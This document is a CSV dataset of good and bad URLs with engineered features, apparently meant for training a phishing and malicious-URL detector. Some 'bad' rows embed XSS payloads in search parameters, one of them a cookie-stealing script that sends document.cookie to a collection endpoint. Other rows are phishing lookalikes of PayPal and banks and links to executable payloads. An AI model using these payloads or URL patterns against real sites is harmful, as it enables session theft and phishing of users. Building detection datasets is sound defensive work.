url,label,protocol,length,count,count-www,count-digits,use_of_ip,shortening_service,https_token,include_domain,web_traffic,registration_length
https://www.google.com/,good,0,23,2,1,0,0,0,0,0,0,98
https://www.amazon.in/gp/product/B07N6LN57W,good,0,43,2,1,5,0,0,0,0,0,42
http://aot.edu.in/campus-communities/,good,1,37,3,0,0,0,0,0,0,0,45
https://abc.com/,good,0,16,1,0,0,0,0,0,0,0,9
https://community.letsupgrade.in/group/blockchain,good,0,49,2,0,0,0,0,0,0,0,7
https://drive.google.com/drive/u/0/,good,0,35,2,0,1,0,0,0,0,0,98
https://www.educative.io/courses/natural-language-processing-ml/JPY6W78ZO4P,good,0,75,5,1,4,0,0,0,0,0,12
https://edusaint.com/school/#/learnsection,good,0,42,1,0,0,0,1,0,0,0,0
https://www.flipkart.com/,good,0,25,2,1,0,0,1,0,0,0,58
https://github.com/roubis09/BloodDonationWebsiteProject,good,0,55,1,0,2,0,0,0,0,0,1
https://www.hoichoi.tv/webseries/tansener-tanpura,good,0,49,3,1,0,0,0,0,0,0,29
https://www.hackerrank.com/access-account/?h_r=home_v2&h_l=header,good,0,65,6,1,1,0,0,0,0,0,45
https://www.hotstar.com/in/movies/chhichhore/1260012713,good,0,55,2,1,10,0,0,0,0,0,18
https://indiancybersecuritysolutions.com/,good,0,41,1,0,0,0,0,0,0,0,13
https://juspay.in/contact,good,0,25,1,0,0,0,0,0,0,0,19
https://www.jdoodle.com/guru,good,0,28,2,1,0,0,0,0,0,0,9
https://www.kaggle.com/akashkr/phishing-website-dataset,good,0,55,4,1,0,0,0,0,0,0,12
https://jiscollege.ac.in/pdf/aceven2019-20.pdf,good,0,46,4,0,6,0,0,0,0,0,57
https://makaut1.ucanapply.com/smartexam/public/admit-card,good,0,57,3,0,1,0,0,0,0,0,6
http://makautexam.net/,good,1,22,1,0,0,0,0,0,0,0,8
https://www.mywbut.com/syllabus/paper/615/dept/2/,good,0,49,2,1,4,0,1,0,0,0,5
https://nextstep.tcs.com/campus/#/,good,0,34,2,0,0,0,0,0,0,0,112
https://olympus.greatlearning.in/learner_dashboard,good,0,50,2,0,0,0,0,0,0,0,50
https://www.amazon.com/amazonprime?_encoding=UTF8&%2AVersion%2A=1&%2Aentries%2A=0,good,0,81,10,1,7,0,0,0,0,0,50
https://www.simplilearn.com/big-data-and-analytics/senior-data-scientist-masters-program-training,good,0,97,10,1,0,0,0,0,0,0,46
https://rounikbiswas.000webhostapp.com/#project,good,0,47,2,0,3,0,0,0,0,0,20
https://student.detailedassessment.com/,good,0,39,2,0,0,0,1,0,0,0,16
https://talentbattle.in/blogs/practice-quantitative-aptitude-questions,good,0,70,4,0,0,0,0,0,0,0,2
https://www.udemy.com/course/automation-with-raspberry-pi-zero/,good,0,63,6,1,0,0,0,0,0,0,11
https://www.virtusa.com/service/user-experience-interface-design/,good,0,65,5,1,0,0,0,0,0,0,54
https://xathon.mettl.com/account/login,good,0,38,2,0,0,0,0,0,0,0,5
https://www.zee5.com/movies/details/madaari/0-0-105980,good,0,54,4,1,9,0,0,0,0,0,16
http://diaryofagameaddict.com/,bad,1,30,1,0,0,0,1,0,0,2,5
http://espdesign.com.au/,bad,1,24,2,0,0,0,0,0,1,1,0
http://iamagameaddict.com/,bad,1,26,1,0,0,0,1,0,0,1,5
http://slightlyoffcenter.net/,bad,1,29,1,0,0,0,0,0,0,1,5
http://toddscarwash.com/,bad,1,24,1,0,0,0,0,0,0,1,9
http://sn-gzzx.com,bad,1,18,2,0,0,0,1,0,0,1,4
http://sunlux.net/company/about.html,bad,1,36,2,0,0,0,0,0,0,1,44
http://www.deletespyware-adware.com/,bad,1,36,3,1,0,0,0,0,0,1,5
http://gmcjjh.org/DHL,bad,1,21,1,0,0,0,0,0,0,1,3
http://oprahsearch.com/scripts/net19.exe,bad,1,40,3,0,2,0,0,0,0,1,2
http://rl8vd.kikul.com/ci7ka5t2ue,bad,1,33,2,0,4,0,0,0,1,1,0
http://xoomer.alice.it/email02/bom.jpg,bad,1,38,3,0,2,0,0,0,0,0,3
http://stormpages.com/master/VoLcoM_04.txt,bad,1,42,2,0,2,0,0,0,0,0,9
http://183.183.97.55/10.mov,bad,1,27,4,0,12,1,0,0,1,1,0
http://asecwitlecn.bid/read.php?f=0.dat,bad,1,39,5,0,1,0,0,0,1,1,0
http://90.2.1.14:6892,bad,1,21,3,0,10,0,0,0,1,1,0
http://91.239.24.132:6892,bad,1,25,3,0,14,0,0,0,1,1,0
http://13453765871837679316.googlegroups.com/attach/5ed5d01,bad,1,59,2,0,24,0,0,0,0,0,6
http://japereznow.com/bdbvcvbndbfnn/mn,bad,1,38,1,0,0,0,0,0,0,1,11
http://133.130.103.10/21/logar/,bad,1,31,3,0,13,1,0,0,1,1,0
https://getpeopleplus.com,good,0,25,1,0,0,0,0,0,0,1,1
http://caixa.com.br.fgtsagendesaqueconta.com/consulta8523211/principal.php,bad,1,74,5,0,7,0,0,0,1,1,0
http://raik.hub-web.com/proccesing-fbaccountss/login.php,bad,1,56,5,0,0,0,0,0,0,1,4
http://dh16.co.vu/css//,bad,1,23,2,0,2,0,0,0,1,0,0
http://nnconsultoria.com.br/Atendimento.Pessoa.Fisica82/atendimento_pessoa_fisica/criptografado/index1.php,bad,1,106,5,0,3,0,0,0,0,1,9
http://security-update-center.serverlux.me/signin/,bad,1,50,4,0,0,0,0,0,0,1,4
http://tinyurl.com/le5tcvf,bad,1,26,1,0,1,0,1,0,0,0,102
http://tinyurl.com/ll59xhm,bad,1,26,1,0,2,0,1,0,0,0,102
http://thehotelmanagment.com/Prime/,bad,1,35,1,0,0,0,1,0,1,1,0
http://binary-project.com/cha/chase/home/action.php,bad,1,51,3,0,0,0,1,0,0,1,2
https://www.udemy.com/courses/search/?src=ukw&q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E,bad,0,98,15,1,6,0,1,0,0,0,11
http://bit.ly/2oOkGv9,bad,1,21,1,0,2,0,1,0,0,0,0
http://ginatringali.com,bad,1,23,1,0,0,0,0,0,1,1,0
http:////al/alibaba21012015/alibaba21012015/666/index.html,bad,1,58,1,0,19,0,0,0,1,1,0
http://restauracjagreenpepper.pl//kmd/image.html,bad,1,48,2,0,0,0,0,0,1,1,0
http://www.sagittariusglobal.com//portal/cache/Cielo/index.html,bad,1,63,3,1,0,0,0,0,0,1,8
http://yahoo.co.in/email_open_log_pic.php,bad,1,41,3,0,0,0,0,0,0,0,10
http://staticmail.000webhostapp.com,bad,1,35,2,0,3,0,0,0,0,0,20
http://dj00.co.vu/css/,bad,1,22,2,0,2,0,0,0,1,0,0
https://www.rhino.com//features/75645p.html,good,0,43,3,1,5,0,0,0,0,0,29
http://http-abcd.com,bad,1,20,2,0,0,0,0,1,1,1,0
http://https-efgh.com,bad,1,21,2,0,0,0,0,1,1,1,0
https://www.udemy.com/courses/search/?src=ukw&q=<img src=x onerror=this.src='http://127.0.0.1/hacking/cookie.php?c='+document.cookie>,bad,0,133,22,1,6,1,1,1,1,0,0
http://abhishekgroup.co.in/wp-http/hanmail/login.php?cmd=login_submit&id=22b74ee3c7f862f2bd7589210b7db92a22b74ee3c7f862f2bd7589210b7db92a&session=22b74ee3c7f862f2bd7589210b7db92a22b74ee3c7f862f2bd7589210b7db92a,bad,1,210,8,0,80,0,0,1,0,0,2
http://abhishekgroup.co.in/wp-http/hanmail/login.php?cmd=login_submit&id=22b74ee3c7f862f2bd7589210b7db92a22b74ee3c7f862f2bd7589210b7db92a&session=22b74ee3c7f862f2bd7589210b7db92a22b74ee3c7f862f2bd7589210b7db92a,bad,1,210,8,0,80,0,0,1,0,0,2
https://www.woodlandworldwide.com/collections/faces/search.jsp?searchkey=%3CsCript%3Ealert(%22rounik%22)%3C/scRipt%3E&clg=10,bad,0,124,12,1,10,0,0,0,0,0,7
http://unicornitems.com/,good,1,24,1,0,0,0,0,0,0,1,4
http://iberianodonataucm.myspecies.info/,good,1,40,2,0,0,0,0,0,0,0,11
http://h2020.myspecies.info/,good,1,28,2,0,4,0,0,0,0,0,11
http://diptera.myspecies.info/,good,1,30,2,0,0,0,0,0,0,0,11
http://pistiaistyoryhma.myspecies.info/,good,1,39,2,0,0,0,0,0,0,0,11
http://weevil.info/,good,1,19,1,0,0,0,0,0,0,0,7
http://mantodea.myspecies.info/,good,1,31,2,0,0,0,0,0,0,0,11
http://e-m-b.org/,good,1,17,3,0,0,0,0,0,0,1,12
http://scratchpads.eu/explore/sites-list,good,1,40,2,0,0,0,0,0,0,0,0
https://www.wpbeginner.com/showcase/excellent-wordpress-website-examples/,good,0,73,5,1,0,0,0,0,0,0,20
https://iiekalyani.com/,good,0,23,1,0,0,0,0,0,0,0,10
http://gnit.ac.in/,good,1,18,2,0,0,0,0,0,0,0,62
http://www.aecwb.edu.in/,good,1,24,3,1,0,0,0,0,0,0,88
http://adamasuniversity.ac.in/,good,1,30,2,0,0,0,0,0,0,0,48
http://adamasuniversity.ac.in/virtual-tour/,good,1,43,3,0,0,0,0,0,0,0,48
http://www.saha.ac.in/web/npd-home,good,1,34,4,1,0,0,0,0,0,0,97
http://www.saha.ac.in/web/npd-alumni/faculty,good,1,44,4,1,0,0,0,0,0,0,97
http://www.hbni.ac.in/cis/sinp.html,good,1,35,4,1,0,0,0,0,0,0,106
http://www.saha.ac.in/web/previous-programs,good,1,43,4,1,0,0,0,0,0,0,97
https://www.architecticastartups.com/,good,0,37,2,1,0,0,0,0,0,0,7
https://www.techsimplus.com/TechSim_Internship/online_summer_internship/,good,0,72,2,1,0,0,0,0,0,0,8
https://www.preservearticles.com/short-essays/time-is-a-tyrant/4900,good,0,67,6,1,4,0,0,0,0,0,16
https://www.kopykitab.com/blog/category/question-paper/wbut-solved-question-papers/,good,0,83,6,1,0,0,0,0,0,0,5
http://192.168.43.112/virus.exe,bad,1,31,4,0,11,1,0,0,1,1,0
http://172.149.1.61/payload.exe,bad,1,31,4,0,9,1,0,0,1,1,0
http://signin.paypal.com@10.19.32.4/o,bad,1,37,6,0,7,1,0,0,1,1,0
http://63.17.167.23/pc/verification.htm?=https://www.paypal.com/,bad,1,64,8,1,9,1,0,1,0,1,10
http://example.com/redirect.php?dest=https://172.43.125.4/,bad,1,58,7,0,9,1,0,1,1,0,0
http://https-items.com,bad,1,22,2,0,0,0,0,1,1,1,0
